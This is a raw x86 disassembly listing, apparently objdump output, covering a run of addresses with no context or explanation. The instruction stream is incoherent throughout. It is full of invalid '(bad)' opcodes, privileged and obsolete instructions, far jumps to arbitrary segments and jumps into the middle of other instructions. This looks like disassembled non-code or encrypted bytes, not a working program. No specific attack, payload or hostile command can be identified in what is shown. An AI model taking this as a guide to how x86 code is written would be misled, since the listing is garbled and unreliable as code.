  4028d3:	arpl   WORD PTR [ecx],si
  4028d5:	test   ecx,ebx
  4028d7:	call   0x6b66bd98
  4028dc:	pushf  
  4028dd:	std    
  4028de:	dec    edi
  4028df:	lea    edi,[edx+0x7f]
  4028e2:	mov    DWORD PTR [ecx],edx
  4028e4:	pop    esi
  4028e5:	sbb    DWORD PTR [ecx+esi*1+0x39],edi
  4028e9:	mov    ch,0x8d
  4028eb:	int    0x4a
  4028ed:	mov    dl,0xa8
  4028ef:	sti    
  4028f0:	inc    edx
  4028f1:	mov    cl,0x96
  4028f3:	pop    edi
  4028f4:	xchg   ecx,eax
  4028f5:	es push es
  4028f7:	ja     0x40294e
  4028f9:	cmp    al,0xe3
  4028fb:	cmp    eax,0xf5193948
  402900:	aam    0xb3
  402902:	rcr    DWORD PTR [ebx+0x4c],0x24
  402906:	daa    
  402907:	xor    eax,0xa3750669
  40290c:	jl     0x402912
  40290e:	cmp    ecx,0x7b
  402911:	ds mov bl,0x88
  402914:	dec    ebx
  402915:	inc    edi
  402916:	js     0x40295d
  402918:	fstp   st(5)
  40291a:	aad    0xaa
  40291c:	pop    esp
  40291d:	and    esp,DWORD PTR [edi-0x3abd2a4d]
  402923:	add    ecx,0xffffff8d
  402926:	mov    bl,0x55
  402928:	mov    al,0xed
  40292a:	sbb    BYTE PTR [esi-0x7f4ad3d6],bh
  402930:	mov    dl,0x7d
  402932:	add    edx,0xffffffda
  402935:	mov    es,WORD PTR [ecx+0x13]
  402938:	pop    edx
  402939:	mov    esi,0xc59bf6eb
  40293e:	jecxz  0x402956
  402940:	jno    0x40295e
  402942:	and    eax,0x114daaf4
  402947:	pusha  
  402948:	push   es
  402949:	xchg   esi,esp
  40294b:	ins    DWORD PTR es:[edi],dx
  40294c:	pop    esi
  40294d:	jecxz  0x402913
  40294f:	sbb    ah,ch
  402951:	pop    esi
  402952:	fild   QWORD PTR [esi-0x5c4e584b]
  402958:	hlt    
  402959:	aad    0x88
  40295b:	mov    dh,0xf2
  40295d:	or     al,0x8c
  40295f:	(bad)  
  402960:	lock scas eax,DWORD PTR es:[edi]
  402962:	add    DWORD PTR [esi],esi
  402964:	call   0x360d:0x86b2426
  40296b:	icebp  
  40296c:	dec    esp
  40296d:	xchg   ebp,eax
  40296e:	cmp    BYTE PTR [edx+0x7b38a56],bl
  402974:	pop    ebx
  402975:	cmp    eax,DWORD PTR [edi-0x195b67d9]
  40297b:	dec    eax
  40297c:	inc    ebx
  40297d:	fsub   QWORD PTR [eax]
  40297f:	add    edi,edi
  402981:	mov    dl,0xa7
  402983:	or     DWORD PTR [ebx],eax
  402985:	pop    ss
  402986:	iret   
  402987:	ror    DWORD PTR [ecx+esi*4-0x7cec3dc8],1
  40298e:	lock daa 
  402990:	fild   QWORD PTR [esi+edx*1]
  402993:	mov    bh,BYTE PTR [eax+ebx*8]
  402996:	loope  0x402978
  402998:	mov    WORD PTR [edx],es
  40299a:	in     al,dx
  40299b:	cwde   
  40299c:	retf   
  40299d:	popa   
  40299e:	stos   DWORD PTR es:[edi],eax
  40299f:	sbb    al,0x33
  4029a1:	xchg   edx,eax
  4029a2:	fcom   DWORD PTR [esi+esi*4+0x684da6cd]
  4029a9:	ja     0x402a15
  4029ab:	inc    ebx
  4029ac:	les    ecx,FWORD PTR [esi]
  4029ae:	xchg   ebp,eax
  4029af:	or     dh,dh
  4029b1:	xchg   edi,eax
  4029b2:	and    eax,0x3a49516f
  4029b7:	xor    DWORD PTR [edx+0x2174f0],0x7f
  4029be:	paddd  mm4,QWORD PTR [edx-0x80]
  4029c2:	pop    esp
  4029c3:	std    
  4029c4:	paddw  mm2,QWORD PTR [esi]
  4029c7:	jns    0x4029ed
  4029c9:	(bad)  
  4029ca:	stc    
  4029cb:	add    esp,DWORD PTR [eax+0x6ff78286]
  4029d1:	cld    
  4029d2:	(bad)  
  4029d3:	fnstenv [edx+0x14bc7d7d]
  4029d9:	lock lods eax,DWORD PTR ds:[esi]
  4029db:	cmp    al,0xb9
  4029dd:	pop    esp
  4029de:	leave  
  4029df:	fcomp  DWORD PTR [edi-0x3c]
  4029e2:	pusha  
  4029e3:	mov    ebx,DWORD PTR [esi+0xe]
  4029e6:	inc    esi
  4029e7:	dec    ebx
  4029e8:	xor    dl,BYTE PTR [edi+0x4d]
  4029eb:	pop    es
  4029ec:	cmc    
  4029ed:	cmp    ebx,edi
  4029ef:	xchg   esp,eax
  4029f0:	(bad)  
  4029f1:	leave  
  4029f2:	aas    
  4029f3:	cmp    al,al
  4029f5:	sub    DWORD PTR [eax+0x13],ebp
  4029f8:	xchg   esi,eax
  4029f9:	repnz add dl,BYTE PTR [esi+0x5a8ede66]
  402a00:	nop
  402a01:	daa    
  402a02:	mov    WORD PTR [ecx-0x49],fs
  402a05:	call   0xd36349a5
  402a0a:	mov    bl,0x63
  402a0c:	call   0x8bfb1402
  402a11:	in     eax,0x12
  402a13:	cli    
  402a14:	repnz test eax,0x2c9203c8
  402a1a:	mov    WORD PTR [ebp+0xffd6611],fs
  402a20:	mov    ch,0xb1
  402a22:	std    
  402a23:	dec    edi
  402a24:	or     eax,0x7b0a7b2c
  402a29:	outs   dx,BYTE PTR ds:[esi]
  402a2a:	mov    cl,0x37
  402a2c:	addr16 loopne 0x4029cf
  402a2f:	push   eax
  402a30:	cmp    al,0xd0
  402a32:	adc    dl,al
  402a34:	inc    ebp
  402a35:	adc    ecx,ecx
  402a37:	mov    bh,0xcd
  402a39:	and    ch,dl
  402a3b:	hlt    
  402a3c:	xor    edi,esp
  402a3e:	cmp    edi,ebp
  402a40:	fsubr  DWORD PTR [ebp+0x6c483329]
  402a46:	das    
  402a47:	clc    
  402a48:	mov    WORD PTR [edi+edi*8+0x50],ds
  402a4c:	fild   WORD PTR ds:0x8bc3e6b
  402a52:	jbe    0x402a6b
  402a54:	sbb    eax,0x7ec264b0
  402a59:	dec    edi
  402a5a:	cwde   
  402a5b:	aaa    
  402a5c:	stos   BYTE PTR es:[edi],al
  402a5d:	jl     0x402aaa
  402a5f:	in     al,0x4a
  402a61:	push   eax
  402a62:	push   0xffffffd0
  402a64:	dec    ecx
  402a65:	adc    ch,BYTE PTR [edx]
  402a67:	push   0xd
  402a69:	inc    ecx
  402a6a:	mov    ch,0x5d
  402a6c:	ret    0xe714
  402a6f:	popf   
  402a70:	and    eax,0x1abc1cd5
  402a75:	jo     0x402a81
  402a77:	repz pusha 
  402a79:	cld    
  402a7a:	xchg   esp,eax
  402a7b:	jg     0x402ac5
  402a7d:	mov    BYTE PTR [esi-0x69],dh
  402a80:	ins    BYTE PTR es:[edi],dx
  402a81:	sub    BYTE PTR [edi+0x1b],ah
  402a84:	inc    edi
  402a85:	es push ebp
  402a87:	inc    edi
  402a88:	push   ebx
  402a89:	and    eax,0x3737ddb5
  402a8e:	aas    
  402a8f:	ds ins BYTE PTR es:[edi],dx
  402a91:	jb     0x402a65
  402a93:	lods   eax,DWORD PTR ds:[esi]
  402a94:	cmc    
  402a95:	add    BYTE PTR [ecx-0x336ddfab],bh
  402a9b:	int    0xc2
  402a9d:	mov    eax,ds:0x5c1a3d7f
  402aa2:	div    DWORD PTR [edi+0x11]
  402aa5:	mov    ebp,DWORD PTR [ebx-0x6c34c349]
  402aab:	ins    BYTE PTR es:[edi],dx
  402aac:	lods   eax,DWORD PTR ds:[esi]
  402aad:	jge    0x402a60
  402aaf:	aas    
  402ab0:	jbe    0x402b23
  402ab2:	ret    
  402ab3:	pop    ds
  402ab4:	mov    esi,0xbd3309bd
  402ab9:	cli    
  402aba:	jp     0x402acd
  402abc:	xor    bh,BYTE PTR [esi+0x6ef38979]
  402ac2:	sbb    ah,BYTE PTR [ecx]
  402ac4:	imul   eax,DWORD PTR [ebp+0x4ab4dd6d],0xd3e87466
  402ace:	cmp    al,BYTE PTR [ebx]
  402ad0:	lods   eax,DWORD PTR ds:[esi]
  402ad1:	add    eax,0x2dfe39e7
  402ad6:	sub    eax,0xce26bde1
  402adb:	mov    bl,0xf9
  402add:	jmp    0x2034bc77
  402ae2:	jge    0x402b3a
  402ae4:	lock or DWORD PTR [ebx],eax
  402ae7:	mov    ecx,0x7007cf3a
  402aec:	fld    QWORD PTR [eax+0x41216a94]
  402af2:	fwait
  402af3:	test   eax,ebp
  402af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402af6:	rol    eax,1
  402af8:	mov    ch,BYTE PTR [ebp+0x76]
  402afb:	xor    BYTE PTR [esp+ebx*4+0x45309ac3],bh
  402b02:	mov    ?,WORD PTR [edi-0x38]
  402b05:	add    eax,0x606f57b2
  402b0a:	dec    esi
  402b0b:	jae    0x402b6d
  402b0d:	dec    eax
  402b0e:	push   ss
  402b0f:	fidivr DWORD PTR [eax]
  402b11:	mov    BYTE PTR [esi],ah
  402b13:	and    eax,0x47f94c3e
  402b18:	and    DWORD PTR [eax],ebx
  402b1a:	xor    al,0x8
  402b1c:	pop    ecx
  402b1d:	int3   
  402b1e:	ja     0x402b67
  402b20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b21:	cli    
  402b22:	xlat   BYTE PTR ds:[ebx]
  402b23:	clc    
  402b24:	inc    ecx
  402b25:	out    dx,eax
  402b26:	dec    ebp
  402b27:	test   al,0xc8
  402b29:	fst    DWORD PTR [edx+ebp*4-0x5cd25705]
  402b30:	(bad)  
  402b31:	call   0xdf06cc64
  402b36:	out    0xda,al
  402b38:	mov    dl,0xfb
  402b3a:	lds    edi,FWORD PTR [ecx+0x55]
  402b3d:	adc    DWORD PTR [edx+0x65e590b7],esi
  402b43:	xor    bl,BYTE PTR [ecx-0x387d80d7]
  402b49:	push   eax
  402b4a:	imul   esp,DWORD PTR [edx+ebx*8+0x4db02676],0x28b9e413
  402b55:	and    eax,0xf7e7de86
  402b5a:	leave  
  402b5b:	sub    ebx,DWORD PTR [ecx+0x78]
  402b5e:	imul   ebp,DWORD PTR [eax],0xffffff8e
  402b61:	adc    ebx,DWORD PTR [ebx+ebx*4-0x52]
  402b65:	dec    edi
  402b66:	dec    ecx
  402b67:	mov    al,0x8b
  402b69:	xor    bl,dh
  402b6b:	icebp  
  402b6c:	sub    al,0x5
  402b6e:	addr16 (bad) 
  402b71:	or     BYTE PTR [ebx+0xfc3f87e],cl
  402b77:	mov    al,ds:0x4220323f
  402b7c:	fiadd  DWORD PTR [esi+0x165ca3ab]
  402b82:	cmp    BYTE PTR [edx+0x74],dh
  402b85:	fild   WORD PTR [edx-0x3513b969]
  402b8b:	(bad)  [eax+ebx*8+0x3ae3c335]
  402b92:	fs add eax,0xdfbbbc2
  402b98:	xchg   esp,eax
  402b99:	sti    
  402b9a:	push   eax
  402b9b:	xor    dh,BYTE PTR [edx+0x12706f18]
  402ba1:	int    0x90
  402ba3:	retf   0x6557
  402ba6:	push   eax
  402ba7:	dec    ecx
  402ba8:	(bad)  
  402ba9:	jae    0x402b3b
  402bab:	and    esi,ecx
  402bad:	sbb    BYTE PTR [eax+0x7e626436],dh
  402bb3:	jnp    0x402bdc
  402bb5:	inc    esi
  402bb6:	aad    0x4a
  402bb8:	test   BYTE PTR [esi+ebp*2],bl
  402bbb:	fnsetpm(287 only) 
  402bbd:	mov    bh,0x9e
  402bbf:	pop    ebx
  402bc0:	mov    eax,ds:0xbeab24fe
  402bc5:	mov    DWORD PTR [esi+ebx*4+0x5d9eaf3f],esp
  402bcc:	jae    0x402ba1
  402bce:	int3   
  402bcf:	push   ebp
  402bd0:	pop    ds
  402bd1:	test   DWORD PTR [edi],esi
  402bd3:	mov    ch,bl
  402bd5:	adc    cl,cl
  402bd7:	pop    ebx
  402bd8:	test   al,0xa
  402bda:	xlat   BYTE PTR ds:[ebx]
  402bdb:	sbb    eax,0x3074ee09
  402be0:	add    eax,0xa7624494
  402be5:	hlt    
  402be6:	imul   eax,DWORD PTR [ebx+ecx*1],0x5a
  402bea:	dec    esi
  402beb:	mov    dh,0x1c
  402bed:	mov    al,ds:0x77e49780
  402bf2:	and    ebx,edx
  402bf4:	aaa    
  402bf5:	pop    esi
  402bf6:	out    dx,eax
  402bf7:	xor    al,0x17
  402bf9:	cmp    bh,ah
  402bfb:	rol    DWORD PTR [ecx],0x99
  402bfe:	and    edx,0x4e
  402c01:	outs   dx,BYTE PTR ds:[esi]
  402c02:	bound  esi,QWORD PTR [ecx+0x7b5ece87]
  402c08:	lods   al,BYTE PTR ds:[esi]
  402c09:	js     0x402c57
  402c0b:	push   ebx
  402c0c:	ins    BYTE PTR es:[edi],dx
  402c0d:	mov    bl,0xef
  402c0f:	push   0xfffffff1
  402c11:	or     DWORD PTR [ebx-0x1e],0xb098967e
  402c18:	cmp    edx,ecx
  402c1a:	inc    eax
  402c1b:	add    eax,ecx
  402c1d:	adc    DWORD PTR [edx-0x1bb03166],ebx
  402c23:	add    edi,DWORD PTR [ecx+0x1ba847b8]
  402c29:	cmp    ah,BYTE PTR [edi+0x225666e2]
  402c2f:	sbb    dl,BYTE PTR [eax+0x36]
  402c32:	(bad)  
  402c33:	xor    DWORD PTR [eax+eax*2+0x31],ebp
  402c37:	push   edx
  402c38:	retf   
  402c39:	je     0x402c70
  402c3b:	xor    eax,0xd4eee9f2
  402c40:	(bad)  
  402c41:	out    dx,al
  402c42:	add    BYTE PTR [ebx],cl
  402c44:	cmp    DWORD PTR [eax-0x60],esi
  402c47:	inc    edx
  402c48:	xor    al,0xa0
  402c4a:	inc    ecx
  402c4b:	les    ebx,FWORD PTR [esi+edx*1+0x46]
  402c4f:	and    BYTE PTR [ebp-0x5e],0x2d
  402c53:	fadd   QWORD PTR [edi+ebp*1-0x40]
  402c57:	adc    esp,ebx
  402c59:	adc    DWORD PTR [eax],eax
  402c5b:	mov    ds:0xd5339ad8,eax
  402c60:	xor    al,0x6e
  402c62:	sahf   
  402c63:	(bad)  [ebx]
  402c65:	shl    BYTE PTR [ebp-0x19572f53],0x45
  402c6c:	cli    
  402c6d:	lahf   
  402c6e:	dec    eax
  402c6f:	repnz les eax,FWORD PTR [ebp+0x26]
  402c73:	std    
  402c74:	js     0x402c55
  402c76:	or     ebx,edi
  402c78:	fdiv   DWORD PTR [esi-0x75200bd4]
  402c7f:	cs pusha 
  402c81:	adc    cl,BYTE PTR [edi-0x7a]
  402c84:	mov    ds:0xaba530d1,al
  402c89:	sub    dh,dh
  402c8b:	xchg   edi,eax
  402c8c:	push   edi
  402c8d:	xchg   DWORD PTR [eax],ecx
  402c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c90:	add    dl,dh
  402c92:	in     al,0x24
  402c94:	jecxz  0x402c54
  402c96:	xchg   BYTE PTR [edi+edx*4-0x12],cl
  402c9a:	pusha  
  402c9b:	cld    
  402c9c:	cmp    eax,0x58763f7d
  402ca1:	sbb    BYTE PTR [ebp-0x7e674f1b],dh
  402ca7:	xor    DWORD PTR [edx-0x752c9ff2],0xbb742cd6
  402cb1:	push   es
  402cb2:	jne    0x402cf7
  402cb4:	ret    
  402cb5:	je     0x402d31
  402cb7:	mov    eax,ds:0xe8088dff
  402cbc:	lock xchg DWORD PTR [ebx],ebp
  402cbf:	fwait
  402cc0:	arpl   ax,bx
  402cc2:	test   al,0xfe
  402cc4:	imul   edx,DWORD PTR [edx-0x33],0xffffffe7
  402cc8:	xor    ebx,DWORD PTR [edi+0x3]
  402ccb:	cmc    
  402ccc:	test   eax,0x45644d3
  402cd1:	in     al,dx
  402cd2:	mov    bl,bl
  402cd4:	les    esi,FWORD PTR [esi+eax*2+0x38457a5f]
  402cdb:	mov    edx,ds
  402cdd:	add    eax,0xd990fbf6
  402ce2:	dec    edx
  402ce3:	jle    0x402d64
  402ce5:	(bad)  
  402ce6:	imul   edi,DWORD PTR [esi-0x2ae57840],0x54de0eed
  402cf0:	std    
  402cf1:	(bad)  
  402cf2:	push   ss
  402cf3:	jo     0x402d60
  402cf5:	pop    eax
  402cf6:	aas    
  402cf7:	neg    edi
  402cf9:	inc    ebp
  402cfa:	inc    esi
  402cfb:	in     al,0x78
  402cfd:	adc    al,0x13
  402cff:	fbld   TBYTE PTR [edi-0x36d0ec78]
  402d05:	add    dh,BYTE PTR ds:0xc96af719
  402d0b:	cmp    ecx,DWORD PTR [ebx]
  402d0d:	dec    edi
  402d0e:	sar    DWORD PTR es:[eax+0x74],cl
  402d12:	add    eax,0x6b6288c3
  402d17:	jne    0x402d91
  402d19:	sbb    esp,ebx
  402d1b:	mov    ds:0x3b48d4eb,eax
  402d20:	call   DWORD PTR [eax+0x49]
  402d23:	pusha  
  402d24:	lds    edi,FWORD PTR [edx-0x32]
  402d27:	ficom  DWORD PTR [edx-0x4a]
  402d2a:	test   bh,bh
  402d2c:	in     eax,dx
  402d2d:	inc    eax
  402d2e:	xchg   ebp,eax
  402d2f:	jp     0x402cb9
  402d31:	pop    edx
  402d32:	cmp    BYTE PTR [edi-0x55e3f031],al
  402d38:	push   ebx
  402d39:	cmp    dh,BYTE PTR [bp+si]
  402d3c:	aaa    
  402d3d:	push   eax
  402d3e:	sub    DWORD PTR [eax],0x5c
  402d41:	fcmovnb st,st(5)
  402d43:	(bad)  
  402d44:	mov    esp,0xad9fbefd
  402d49:	sbb    esi,esp
  402d4b:	mov    ss,WORD PTR [edx]
  402d4d:	adc    DWORD PTR [edx],ecx
  402d4f:	or     ebx,DWORD PTR [esi-0x23]
  402d52:	jne    0x402d7e
  402d54:	xor    eax,DWORD PTR [eax]
  402d56:	outs   dx,DWORD PTR ds:[esi]
  402d57:	sub    cl,BYTE PTR [esi+eax*8-0x35]
  402d5b:	mov    edi,0xe12db6f4
  402d60:	test   BYTE PTR [ebp+0x6],0x20
  402d64:	jno    0x402cf9
  402d66:	loopne 0x402cfe
  402d68:	int    0x61
  402d6a:	inc    edi
  402d6b:	adc    eax,0x296098c0
  402d70:	mov    bl,0xab
  402d72:	dec    eax
  402d73:	icebp  
  402d74:	mov    edi,0x46aa53b2
  402d79:	not    DWORD PTR [edx+0x65]
  402d7c:	dec    ebx
  402d7d:	mul    BYTE PTR [ecx+ebp*8]
  402d80:	xchg   edi,esp
  402d82:	lock ret 
  402d84:	(bad)  
  402d85:	jo     0x402dae
  402d87:	loop   0x402dc7
  402d89:	sub    BYTE PTR [eax],cl
  402d8b:	cmp    ebx,edi
  402d8d:	in     al,dx
  402d8e:	pop    esi
  402d8f:	hlt    
  402d90:	sub    eax,0xad468f8a
  402d95:	jmp    0x767c:0x56fbc1d
  402d9c:	mov    ds:0xbd3a31ec,al
  402da1:	fxch   st(4)
  402da3:	inc    esp
  402da4:	jg     0x402dee
  402da6:	jb     0x402dc9
  402da8:	pop    DWORD PTR [esi-0x66]
  402dab:	ror    ch,0x56
  402dae:	hlt    
  402daf:	push   0xffffff9a
  402db1:	jp     0x402e10
  402db3:	xor    esi,ecx
  402db5:	shl    ch,cl
  402db7:	mov    eax,ds:0xfa6dd199
  402dbc:	push   ebp
  402dbd:	sbb    BYTE PTR [edx-0x5],bl
  402dc0:	pop    ebp
  402dc1:	xor    ebx,DWORD PTR [edx+edx*2]
  402dc4:	push   es
  402dc5:	inc    esp
  402dc6:	and    al,0x40
  402dc8:	push   eax
  402dc9:	icebp  
  402dca:	or     dl,BYTE PTR ds:0x2c5d5f3b
  402dd0:	pop    eax
  402dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dd2:	ret    
  402dd3:	inc    esi
  402dd4:	mov    DWORD PTR es:[ebx-0x3],ecx
  402dd8:	sbb    BYTE PTR [bp-0x11],bl
  402ddc:	cmp    bl,BYTE PTR [ecx]
  402dde:	imul   esi,DWORD PTR ds:0xf05aa9c5,0x7fb514cc
  402de8:	daa    
  402de9:	push   cs
  402dea:	push   0xffffffdc
  402dec:	(bad)  
  402ded:	std    
  402dee:	push   ds
  402def:	out    dx,al
  402df0:	daa    
  402df1:	cs jmp 0xd5aa:0x7d662d73
  402df9:	ins    DWORD PTR es:[edi],dx
  402dfa:	jl     0x402d97
  402dfc:	repz fcomp QWORD PTR [eax+eax*4]
  402e00:	inc    esp
  402e01:	jp     0x402dc4
  402e03:	mov    edx,0x3633a2c3
  402e08:	sbb    eax,0xdea3c979
  402e0d:	das    
  402e0e:	pop    eax
  402e0f:	outs   dx,DWORD PTR ds:[esi]
  402e10:	js     0x402dd0
  402e12:	mov    es,WORD PTR [eax+0x3ec58776]
  402e18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e19:	and    eax,DWORD PTR ds:0xeab77ff6
  402e1f:	sbb    ecx,edi
  402e21:	sbb    edx,eax
  402e23:	cmp    eax,0x7c60e725
  402e28:	xchg   esp,eax
  402e29:	adc    ebx,edi
  402e2b:	outs   dx,DWORD PTR ds:[esi]
  402e2c:	dec    esp
  402e2d:	jnp    0x402daf
  402e2f:	dec    esi
  402e30:	and    bl,ah
  402e32:	into   
  402e33:	jg     0x402e0c
  402e35:	mov    al,BYTE PTR [ebx-0x1b]
  402e38:	adc    DWORD PTR [ebx+eax*2],eax
  402e3b:	push   esp
  402e3c:	pop    eax
  402e3d:	jp     0x402e46
  402e3f:	lea    edx,[eax]
  402e41:	addr16 mov al,gs:0xfc79
  402e46:	fistp  QWORD PTR [ecx-0xb4fc98b]
  402e4c:	xchg   DWORD PTR [eax-0x63],esp
  402e4f:	test   DWORD PTR [ecx+0x14],ebp
  402e52:	mov    edx,0xf7522f6d
  402e57:	mov    eax,ds:0xb80a86c2
  402e5c:	inc    edx
  402e5d:	in     al,0x2b
  402e5f:	nop
  402e60:	sahf   
  402e61:	pusha  
  402e62:	aas    
  402e63:	add    al,0x2d
  402e65:	pop    ds
  402e66:	push   edi
  402e67:	pushf  
  402e68:	aad    0x2c
  402e6a:	dec    ebp
  402e6b:	sub    ebx,DWORD PTR [edi+eax*1+0x20]
  402e6f:	inc    esp
  402e70:	xchg   ebp,eax
  402e71:	rol    DWORD PTR [ebx],0xe5
  402e74:	and    BYTE PTR [bx+di+0x3a0f],0x96
  402e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e7b:	pop    es
  402e7c:	lods   eax,DWORD PTR ds:[esi]
  402e7d:	cmp    esp,esp
  402e7f:	test   al,0xf3
  402e81:	aaa    
  402e82:	stos   DWORD PTR es:[edi],eax
  402e83:	ror    BYTE PTR [eax-0x2c],cl
  402e86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e87:	sub    BYTE PTR [edi],dl
  402e89:	cmc    
  402e8a:	cdq    
  402e8b:	sub    ch,0xf8
  402e8e:	push   esi
  402e8f:	and    eax,0x42ff8b25
  402e94:	jg     0x402ecb
  402e96:	out    0x83,eax
  402e98:	scas   al,BYTE PTR es:[edi]
  402e99:	xlat   BYTE PTR ds:[ebx]
  402e9a:	push   edi
  402e9b:	repz pop ebp
  402e9d:	mov    DWORD PTR fs:[ebx],edi
  402ea0:	ins    DWORD PTR es:[edi],dx
  402ea1:	push   ebp
  402ea2:	jo     0x402f1f
  402ea4:	or     eax,0x38b87f99
  402ea9:	outs   dx,BYTE PTR ds:[esi]
  402eaa:	ret    
  402eab:	mov    BYTE PTR [esi],dl
  402ead:	sub    eax,0xff7cb0d9
  402eb2:	leave  
  402eb3:	ds jmp 0xe1b7:0xafafb98c
  402ebb:	cli    
  402ebc:	push   0x5e
  402ebe:	sub    dl,BYTE PTR [edi]
  402ec0:	or     DWORD PTR [ebx+0x11],ebx
  402ec3:	push   ebx
  402ec4:	mov    dh,0x59
  402ec6:	mov    BYTE PTR [edi],bl
  402ec8:	retf   
  402ec9:	ret    0x10d3
  402ecc:	cli    
  402ecd:	lods   eax,DWORD PTR ds:[esi]
  402ece:	push   ecx
  402ecf:	(bad)  
  402ed0:	lods   al,BYTE PTR ds:[esi]
  402ed1:	jo     0x402f10
  402ed3:	cwde   
  402ed4:	das    
  402ed5:	dec    ecx
  402ed6:	hlt    
  402ed7:	mov    al,0xf3
  402ed9:	mov    ecx,0x48dfe0ce
  402ede:	cmp    ecx,edx
  402ee0:	jmp    0x71a2390d
  402ee5:	mov    esi,0x8459e08e
  402eea:	imul   ebx,DWORD PTR [edx+0x3c],0x8f30bffe
  402ef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ef2:	sub    BYTE PTR [ebp-0x60558221],cl
  402ef8:	outs   dx,BYTE PTR ds:[esi]
  402ef9:	xchg   ecx,eax
  402efa:	sub    BYTE PTR [eax],dl
  402efc:	mov    esi,0xb16c86b1
  402f01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f02:	sbb    BYTE PTR [ebx+edi*1],al
  402f05:	pusha  
  402f06:	sbb    eax,DWORD PTR [ebp+eax*1+0x5c]
  402f0a:	push   ebp
  402f0b:	cmp    edi,esi
  402f0d:	call   0x7820:0x128979f1
  402f14:	adc    ebp,DWORD PTR [ecx-0x540e9946]
  402f1a:	mov    ebp,0x86fce92c
  402f1f:	add    DWORD PTR [eax],ecx
  402f21:	mov    ebp,DWORD PTR [ecx]
  402f23:	mov    bl,0x2a
  402f25:	jns    0x402ec3
  402f27:	mov    ebx,0xad47d6f4
  402f2c:	inc    ebp
  402f2d:	sti    
  402f2e:	(bad)  
  402f2f:	imul   edi,DWORD PTR [ebx],0x23
  402f32:	push   DWORD PTR ds:0xfc94c1a0
  402f38:	xchg   ebx,eax
  402f39:	(bad)  
  402f3a:	push   ds
  402f3b:	stc    
  402f3c:	pop    es
  402f3d:	add    dl,BYTE PTR [eax]
  402f3f:	sbb    esi,esi
  402f41:	cmp    bh,BYTE PTR [ecx+0x19d328cc]
  402f47:	pushf  
  402f48:	aas    
  402f49:	push   ss
  402f4a:	mov    DWORD PTR [ebp+0x19194ffd],esi
  402f50:	add    eax,0xb0e2ad10
  402f55:	inc    esi
  402f56:	in     eax,dx
  402f57:	lds    edi,FWORD PTR [ecx+edx*2+0xfe1ace]
  402f5e:	sbb    eax,DWORD PTR [ecx+0x5a]
  402f61:	outs   dx,DWORD PTR ds:[esi]
  402f62:	sti    
  402f63:	pop    edi
  402f64:	cmp    eax,0x7e1fb682
  402f69:	inc    esi
  402f6a:	loope  0x402f17
  402f6c:	in     eax,0x14
  402f6e:	inc    ebp
  402f6f:	xchg   ebp,eax
  402f70:	stc    
  402f71:	aad    0xf5
  402f73:	push   ss
  402f74:	add    BYTE PTR [ebp-0x7],0x66
  402f78:	sbb    esi,eax
  402f7a:	mov    esi,0x600ffddc
  402f7f:	pushf  
  402f80:	adc    BYTE PTR [eax],0x17
  402f83:	jg     0x402fd7
  402f85:	ret    0x9cdf
  402f88:	jbe    0x402fde
  402f8a:	pop    edx
  402f8b:	xor    eax,0x69b42a2
  402f90:	jae    0x402fd2
  402f92:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  402f94:	(bad)  
  402f95:	dec    eax
  402f96:	ficomp DWORD PTR [ecx]
  402f98:	arpl   WORD PTR [esi],di
  402f9a:	aaa    
  402f9b:	cmp    BYTE PTR [edx-0x7e],dh
  402f9e:	test   eax,0xa6c3a898
  402fa3:	scas   al,BYTE PTR es:[edi]
  402fa4:	cmp    al,0xde
  402fa6:	call   0xf6621aa2
  402fab:	adc    eax,0x8065ae
  402fb0:	lock and DWORD PTR [edx-0x56],esi
  402fb4:	aam    0x49
  402fb6:	and    esi,DWORD PTR [eax+0x4]
  402fb9:	pop    esp
  402fba:	jmp    0xef09:0x1b545515
  402fc1:	sbb    BYTE PTR [eax+0x2f],ch
  402fc4:	jae    0x403008
  402fc6:	add    eax,0x55a13e42
  402fcb:	and    al,BYTE PTR [ecx-0x2b]
  402fce:	fwait
  402fcf:	cmp    eax,0x91c652b0
  402fd4:	es ins DWORD PTR es:[edi],dx
  402fd6:	retf   0xcdee
  402fd9:	outs   dx,DWORD PTR ds:[esi]
  402fda:	jmp    0x403005
  402fdc:	cs rcl dh,1
  402fdf:	shl    DWORD PTR [edi-0x77f4086c],1
  402fe5:	mov    WORD PTR [ecx+0x1b23aa8e],es
  402feb:	mov    ebp,DWORD PTR [esi+0x64]
  402fee:	call   0x1012:0x636b74f5
  402ff5:	repnz loope 0x402fd1
  402ff8:	jne    0x402f82
  402ffa:	fist   DWORD PTR ds:0xf4cb2806
  403000:	out    0x6,al
  403002:	jo     0x402fcc
  403004:	xchg   ebp,eax
  403005:	jnp    0x402fde
  403007:	loop   0x403072
  403009:	xor    eax,0x65e81d10
  40300e:	aad    0x9c
  403010:	in     eax,0x6d
  403012:	leave  
  403013:	xchg   esi,ebp
  403015:	call   DWORD PTR [ebp-0x53c5fa04]
  40301b:	sti    
  40301c:	add    al,0xda
  40301e:	push   ds
  40301f:	push   ecx
  403020:	out    0xae,al
  403022:	mov    BYTE PTR [esi+0x4f],dh
  403025:	cld    
  403026:	sub    al,0x1e
  403028:	mov    edx,0xa7b7280a
  40302d:	in     eax,dx
  40302e:	cmp    al,0x2e
  403030:	popf   
  403031:	call   0x2e71:0x34aee80f
  403038:	pop    eax
  403039:	pop    edi
  40303a:	enter  0xd06,0x81
  40303e:	or     eax,0x42049bb5
  403043:	clc    
  403044:	cmp    cl,BYTE PTR [ebx+0x4c245393]
  40304a:	jg     0x402fed
  40304c:	mov    eax,ds:0xe8ff0a26
  403051:	mov    edx,0x6d3c837
  403056:	test   BYTE PTR [ebx+0x71],al
  403059:	pop    esp
  40305a:	xchg   edx,eax
  40305b:	sub    BYTE PTR cs:[edx+0x19803301],al
  403062:	mov    eax,0xddd16cde
  403067:	xor    DWORD PTR ds:0x8b54cc20,edi
  40306d:	mov    ebp,0xf9fb5eee
  403072:	jl     0x403037
  403074:	es cmp eax,0xb63a57dd
  40307a:	jae    0x4030d3
  40307c:	or     eax,0x562ee9ce
  403081:	adc    BYTE PTR [edx],dl
  403083:	aam    0x37
